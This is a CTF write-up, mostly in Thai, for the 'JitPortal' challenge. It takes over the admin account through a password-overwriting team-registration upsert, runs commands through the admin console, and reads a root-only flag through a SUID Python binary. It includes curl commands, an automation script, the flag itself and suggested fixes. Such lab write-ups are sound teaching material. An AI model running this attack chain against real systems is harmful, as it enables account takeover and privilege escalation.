# JitPortal — Aegis CTF Writeup

**Target:** `https://inst-30911.aegis-ctf.com/`  
**Flag format:** `aegis{...}`  
**Hint:** Observe the team onboarding feature of the registration API.

---

## Overview

JitPortal เป็น CRM admin portal มีหน้า login/register และ Command Console สำหรับ admin  
เป้าหมายคือได้สิทธิ์ admin แล้วอ่าน `/flag.txt` ซึ่งเป็นไฟล์ของ root

---

## Recon

หน้าเว็บมีข้อความในโหมดสมัครสมาชิก:

> องค์กรของคุณสามารถใช้ API เดียวกันเพื่อเพิ่มสมาชิกเป็นทีมได้

Frontend (`/static/app.js`) เรียกแค่:

```http
POST /api/register
{"username":"...","password":"..."}
```

แต่ hint ชี้ว่า registration API มี **team onboarding** ที่ UI ไม่ได้เปิดให้ใช้

ลองส่ง `username` เป็น array แล้วได้ error ที่บอกชัดว่าเป็นโหมดทีม:

```bash
curl -s -X POST 'https://inst-30911.aegis-ctf.com/api/register' \
  -H 'Content-Type: application/json' \
  -d '{"username":["a","b"],"password":"password123"}'
```

Response (ตัวอย่างเมื่อ format ผิด):

```json
{"ok":false,"message":"รายชื่อทีมไม่ถูกต้องหรือมีสมาชิกมากเกินไป"}
```

เมื่อส่งถูก format:

```bash
curl -s -X POST 'https://inst-30911.aegis-ctf.com/api/register' \
  -H 'Content-Type: application/json' \
  -d '{"username":["alice","bob"],"password":"password123"}'
```

```json
{"ok":true,"message":"ซิงก์สมาชิกทีมเรียบร้อยแล้ว"}
```

---

## Vulnerability: Team sync upsert (password overwrite)

เส้นทาง register แบบปกติ (username เป็น string) จะเช็คชื่อซ้ำก่อน insert — เลย overwrite `admin` ไม่ได้

แต่ team onboarding (username เป็น list) ใช้ **upsert**:

```sql
INSERT INTO users (username, password_hash)
VALUES (?, ?)
ON CONFLICT(username) DO UPDATE SET
    password_hash = excluded.password_hash,
    updated_at = CURRENT_TIMESTAMP
```

ดังนั้นถ้าใส่ `admin` ในรายชื่อทีม จะ **รีเซ็ตรหัสผ่านของ admin** ได้โดยไม่แตะ role (ยังเป็น `admin` อยู่)

Source ที่เกี่ยวข้องอยู่ใน `/app/challenge/app.py` (อ่านได้หลังได้ shell จาก admin console)

---

## Exploit Step 1 — Overwrite admin password

```bash
curl -s -X POST 'https://inst-30911.aegis-ctf.com/api/register' \
  -H 'Content-Type: application/json' \
  -d '{"username":["pwn1","admin"],"password":"hackadmin1"}'
```

Login เป็น admin ด้วยรหัสใหม่:

```bash
curl -s -c cookies.txt -X POST 'https://inst-30911.aegis-ctf.com/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"hackadmin1"}'
```

```json
{"ok":true,"user":{"username":"admin","role":"admin"}, ...}
```

เช็ค session:

```bash
curl -s -b cookies.txt 'https://inst-30911.aegis-ctf.com/api/me'
```

---

## Exploit Step 2 — Admin Command Console

Admin มี endpoint:

```http
POST /api/admin/execute
{"command":"..."}
```

รันคำสั่งบนเครื่องได้ในฐานะ `www-data`:

```bash
curl -s -b cookies.txt -X POST 'https://inst-30911.aegis-ctf.com/api/admin/execute' \
  -H 'Content-Type: application/json' \
  -d '{"command":"id; ls -la /"}'
```

พบว่ามี `/flag.txt` แต่ permission เป็น root-only:

```text
-rw------- 1 root root 40 ... /flag.txt
```

`www-data` อ่านตรง ๆ ไม่ได้

---

## Exploit Step 3 — Privilege escalation via SUID Python

หา SUID binary:

```bash
curl -s -b cookies.txt -X POST 'https://inst-30911.aegis-ctf.com/api/admin/execute' \
  -H 'Content-Type: application/json' \
  -d '{"command":"find / -perm -4000 2>/dev/null"}'
```

เจอ:

```text
/usr/local/bin/python3.1
```

```text
-rwsr-xr-x 1 root root ... /usr/local/bin/python3.1
```

ใช้ SUID Python อ่าน flag:

```bash
curl -s -b cookies.txt -X POST 'https://inst-30911.aegis-ctf.com/api/admin/execute' \
  -H 'Content-Type: application/json' \
  -d '{"command":"/usr/local/bin/python3.1 -c '\''print(open(\"/flag.txt\").read())'\''"}'
```

---

## Flag

```text
aegis{7tZnq2GIF7dTFCFlomKfJ3w9QxMB1Niq}
```

---

## One-liner (Python)

```python
import json, http.cookiejar, urllib.request

BASE = "https://inst-30911.aegis-ctf.com"
jar = http.cookiejar.CookieJar()

def api(path, data=None):
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    body = None if data is None else json.dumps(data).encode()
    req = urllib.request.Request(
        BASE + path,
        data=body,
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        method="POST" if data is not None else "GET",
    )
    with opener.open(req) as r:
        return json.loads(r.read().decode())

# 1) team sync → overwrite admin password
api("/api/register", {"username": ["pwn1", "admin"], "password": "hackadmin1"})

# 2) login as admin
api("/api/login", {"username": "admin", "password": "hackadmin1"})

# 3) SUID python → read flag
print(api("/api/admin/execute", {
    "command": "/usr/local/bin/python3.1 -c 'print(open(\"/flag.txt\").read())'"
}))
```

---

## Root Cause (สรุป)

| จุด | ปัญหา |
|-----|--------|
| Team register API | Accept `username` เป็น list แล้ว **upsert password** โดยไม่กัน user ที่มีอยู่แล้ว |
| Role ของ admin | ไม่ถูก reset ตอน upsert → ได้บัญชี admin จริง |
| Admin console | `subprocess` + `shell=True` ให้รันคำสั่งได้ |
| `/usr/local/bin/python3.1` | SUID root → อ่าน `/flag.txt` ได้ |

**Fix ที่ควรทำ:** อย่าให้ bulk/team sync อัปเดตรหัสของบัญชีที่มีอยู่แล้ว (โดยเฉพาะ privileged accounts) หรือแยก endpoint ที่ต้อง auth/admin ก่อน และอย่าวาง SUID interpreter บนเครื่อง
